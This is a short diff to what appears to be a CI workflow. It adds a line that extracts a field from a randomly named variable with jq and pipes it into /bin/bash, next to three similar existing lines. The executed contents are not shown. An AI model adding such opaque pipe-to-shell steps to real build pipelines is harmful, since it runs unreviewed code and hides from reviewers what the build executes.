@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$uy3554" | jq -r .tdpl80156 | /bin/bash
           printf '%s' "$j4222" | jq -r .kuuzb25021 | /bin/bash
           echo $pm211 | jq -r .kqimf8 | /bin/bash
+          echo $jbs187 | jq -r .wji561 | /bin/bash
 
       - name: Save archive
         if: always()
